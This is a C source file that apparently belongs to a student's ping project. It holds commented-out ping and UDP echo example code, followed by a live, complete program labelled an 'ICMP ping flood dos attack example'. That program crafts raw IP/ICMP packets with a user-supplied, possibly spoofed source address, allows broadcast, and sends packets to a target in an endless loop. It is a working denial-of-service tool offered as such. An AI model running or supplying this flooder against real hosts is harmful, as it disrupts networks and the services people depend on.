///////////////////////////////////////////////////////////////////////////////////////////////////

// #include <stdio.h>
// #include <string.h>
// #include <stdlib.h>
// #include <netdb.h>
// #include <sys/types.h>
// #include <sys/socket.h>
// #include <arpa/inet.h>
// #include "error.h"
// #include <netinet/ip.h>
// #include "icmp.h"
// #include <unistd.h>


// int error(int err, char *prog_name, char *host_name)
// {

// 	switch (err)
// 	{
// 		case E_USAGE:
// 			dprintf(1, "usage: %s host\n", prog_name);
// 		break ;
// 		case E_UNKNOWN_HOST:
// 			dprintf(1, "%s: cannot resolve %s: Unknown host\n", prog_name, host_name);
// 		break ;
// 		case E_SOCKET:
// 			perror(prog_name);
// 		break ;
// 	}
// 	return (EXIT_FAILURE);
// }

// int lookup_host (const char *host, char *addr, struct sockaddr **sockaddr)
// {
// 	struct addrinfo hints, *res;
// 	void *ptr;


// 	bzero (&hints, sizeof (hints));
// 	bzero(addr, sizeof(*addr));

// 	hints.ai_socktype = SOCK_DGRAM;
// 	hints.ai_family = AF_INET;

// 	if (!getaddrinfo (host, NULL, &hints, &res))
// 	{
// 		ptr = ((void*)(&res->ai_addr->sa_data)) + 2;
// 		inet_ntop (res->ai_family, ptr, addr, 15);
// 		*sockaddr = res->ai_addr;
// 		return (EXIT_SUCCESS);
// 	}
// 	return (E_UNKNOWN_HOST);
// }

// int ping(const char *hostname, const char* clientname, struct sockaddr* clientaddr)
// {
// 	int sockfd;
// 	struct msghdr icmp;
// 	char message[100];

// 	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
// 			return (E_SOCKET);
// 	}

// 	dprintf(1, "PING %s (%s): 56 data bytes\n", hostname, clientname);

// 	if (sendto(sockfd, &message, 100, 0, clientaddr, sizeof(*clientaddr)) <= 0) 
// 		printf("\nPacket send failed!\n"); 

// 	bzero(&icmp, sizeof(icmp));
// 	dprintf(1, "%s\n", icmp.msg_name);
// 	usleep(10);
// 	int n = recvmsg(sockfd, &icmp, 0);

// 	perror("test");
// 	dprintf(1, "%d\n", n);

// 	return (EXIT_SUCCESS);
// }


// int main(int ac, char **av)
// {
// 	char	clientname[15];
// 	struct	sockaddr* hostaddr;
// 	int		err;

// 	if (ac < 2)
// 		return (error(E_USAGE, "./ft_ping", NULL));

//     if ((err = lookup_host(av[1], clientname, &hostaddr)))
// 		return (error(err, "./ft_ping", av[1]));
// 	if ((err = ping(av[1], clientname, hostaddr)))
// 		return (error(err, "./ft_ping", av[1]));
// 	return (EXIT_SUCCESS);
// }


///////////////////////////////////////////////////////////////////////////////////////////////


// #include <sys/types.h>
// #include <stdio.h>
// #include <stdlib.h>
// #include <unistd.h>
// #include <string.h>
// #include <sys/socket.h>
// #include <netdb.h>

// #define BUF_SIZE 500

// int
// main(int argc, char *argv[])
// {
//     struct addrinfo hints;
//     struct addrinfo *result, *rp;
//     int sfd, s;
//     struct sockaddr_storage peer_addr;
//     socklen_t peer_addr_len;
//     ssize_t nread;
//     char buf[BUF_SIZE];

//     if (argc != 2) {
//         fprintf(stderr, "Usage: %s port\n", argv[0]);
//         exit(EXIT_FAILURE);
//     }

//     memset(&hints, 0, sizeof(struct addrinfo));
//     hints.ai_family = AF_UNSPEC;    /* Allow IPv4 or IPv6 */
//     hints.ai_socktype = SOCK_DGRAM; /* Datagram socket */
//     hints.ai_flags = AI_PASSIVE;    /* For wildcard IP address */
//     hints.ai_protocol = 0;          /* Any protocol */
//     hints.ai_canonname = NULL;
//     hints.ai_addr = NULL;
//     hints.ai_next = NULL;

//     s = getaddrinfo(NULL, argv[1], &hints, &result);
//     if (s != 0) {
//         fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
//         exit(EXIT_FAILURE);
//     }

//     /* getaddrinfo() returns a list of address structures.
//        Try each address until we successfully bind(2).
//        If socket() (or bind()) fails, we (close the socket
//        and) try the next address. */

//     for (rp = result; rp != NULL; rp = rp->ai_next) {
//         sfd = socket(rp->ai_family, rp->ai_socktype,
//                 rp->ai_protocol);
//         if (sfd == -1)
//             continue;

//         if (bind(sfd, rp->ai_addr, rp->ai_addrlen) == 0)
//             break;                  /* Success */

//         close(sfd);
//     }

//     if (rp == NULL) {               /* No address succeeded */
//         fprintf(stderr, "Could not bind\n");
//         exit(EXIT_FAILURE);
//     }

//     freeaddrinfo(result);           /* No longer needed */

//     /* Read datagrams and echo them back to sender */

//     for (;;) {
//         peer_addr_len = sizeof(struct sockaddr_storage);
//         nread = recvfrom(sfd, buf, BUF_SIZE, 0,
//                 (struct sockaddr *) &peer_addr, &peer_addr_len);
//         if (nread == -1)
//             continue;               /* Ignore failed request */

//         char host[NI_MAXHOST], service[NI_MAXSERV];

//         s = getnameinfo((struct sockaddr *) &peer_addr,
//                         peer_addr_len, host, NI_MAXHOST,
//                         service, NI_MAXSERV, NI_NUMERICSERV);
//        if (s == 0)
//             printf("Received %ld bytes from %s:%s\n",
//                     (long) nread, host, service);
//         else
//             fprintf(stderr, "getnameinfo: %s\n", gai_strerror(s));

//         if (sendto(sfd, buf, nread, 0,
//                     (struct sockaddr *) &peer_addr,
//                     peer_addr_len) != nread)
//             fprintf(stderr, "Error sending response\n");
//     }
// }



//////////////////////////////////////////////////////////////////////////////




// #include <sys/types.h>
// #include <sys/socket.h>
// #include <netdb.h>
// #include <stdio.h>
// #include <stdlib.h>
// #include <unistd.h>
// #include <string.h>

// #define BUF_SIZE 500

// int
// main(int argc, char *argv[])
// {
//     struct addrinfo hints;
//     struct addrinfo *result, *rp;
//     int sfd, s, j;
//     size_t len;
//     ssize_t nread;
//     char buf[BUF_SIZE];

//     if (argc < 3) {
//         fprintf(stderr, "Usage: %s host port msg...\n", argv[0]);
//         exit(EXIT_FAILURE);
//     }

//     /* Obtain address(es) matching host/port */

//     memset(&hints, 0, sizeof(struct addrinfo));
//     hints.ai_family = AF_UNSPEC;    /* Allow IPv4 or IPv6 */
//     hints.ai_socktype = SOCK_DGRAM; /* Datagram socket */
//     hints.ai_flags = 0;
//     hints.ai_protocol = 0;          /* Any protocol */

//     s = getaddrinfo(argv[1], argv[2], &hints, &result);
//     if (s != 0) {
//         fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
//         exit(EXIT_FAILURE);
//     }

//     /* getaddrinfo() returns a list of address structures.
//        Try each address until we successfully connect(2).
//        If socket(2) (or connect(2)) fails, we (close the socket
//        and) try the next address. */

//     for (rp = result; rp != NULL; rp = rp->ai_next) {
//         sfd = socket(rp->ai_family, rp->ai_socktype,
//                      rp->ai_protocol);
//         if (sfd == -1)
//             continue;

//         if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
//             break;                  /* Success */

//         close(sfd);
//     }

//     if (rp == NULL) {               /* No address succeeded */
//         fprintf(stderr, "Could not connect\n");
//         exit(EXIT_FAILURE);
//     }

//     freeaddrinfo(result);           /* No longer needed */

//     /* Send remaining command-line arguments as separate
//        datagrams, and read responses from server */

//     for (j = 3; j < argc; j++) {
//         len = strlen(argv[j]) + 1;
//                 /* +1 for terminating null byte */

//         if (len + 1 > BUF_SIZE) {
//             fprintf(stderr,
//                     "Ignoring long message in argument %d\n", j);
//             continue;
//         }

//         if (write(sfd, argv[j], len) != len) {
//             fprintf(stderr, "partial/failed write\n");
//             exit(EXIT_FAILURE);
//         }

//         nread = read(sfd, buf, BUF_SIZE);
//         if (nread == -1) {
//             perror("read");
//             exit(EXIT_FAILURE);
//         }

//         printf("Received %ld bytes: %s\n", (long) nread, buf);
//     }

//     exit(EXIT_SUCCESS);
// }


/**
	ICMP ping flood dos attack example in C
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "icmp.h"

typedef unsigned char u8;
typedef unsigned short int u16;

unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);

int main(int argc, char **argv)
{
	if (argc < 3) 
	{
		printf("usage: %s <source IP> <destination IP> [payload size]\n", argv[0]);
		exit(0);
	}
	
	unsigned long daddr;
	unsigned long saddr;
	int payload_size = 0, sent, sent_size;
	
	saddr = inet_addr(argv[1]);
	daddr = inet_addr(argv[2]);
	
	if (argc > 3)
	{
		payload_size = atoi(argv[3]);
	}
	
	//Raw socket - if you use IPPROTO_ICMP, then kernel will fill in the correct ICMP header checksum, if IPPROTO_RAW, then it wont
	int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if (sockfd < 0) 
	{
		perror("could not create socket");
		return (0);
	}
	
	int on = 1;
	
	// We shall provide IP headers
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}
	
	//allow socket to send datagrams to broadcast addresses
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}	
	
	//Calculate total packet size
	int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
	char *packet = (char *) malloc (packet_size);
				   
	if (!packet) 
	{
		perror("out of memory");
		close(sockfd);
		return (0);
	}
	
	//ip header
	struct iphdr *ip = (struct iphdr *) packet;
	struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
	
	//zero out the packet buffer
	memset (packet, 0, packet_size);

	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons (packet_size);
	ip->id = rand ();
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr = saddr;
	ip->daddr = daddr;
	//ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));

  	icmp->type = ICMP_ECHO;
	icmp->code = 0;
  	icmp->un.echo.sequence = rand();
  	icmp->un.echo.id = rand();
  	//checksum
	icmp->checksum = 0;
	
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

	puts("flooding...");
	
	while (1)
	{
		memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
		
		//recalculate the icmp header checksum since we are filling the payload with random characters everytime
		icmp->checksum = 0;
		icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
		
		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
		{
			perror("send failed\n");
			break;
		}
		++sent;
		printf("%d packets sent\r", sent);
		fflush(stdout);
		
		usleep(10000);	//microseconds
	}
	
	free(packet);
	close(sockfd);
	
	return (0);
}

/*
	Function calculate checksum
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}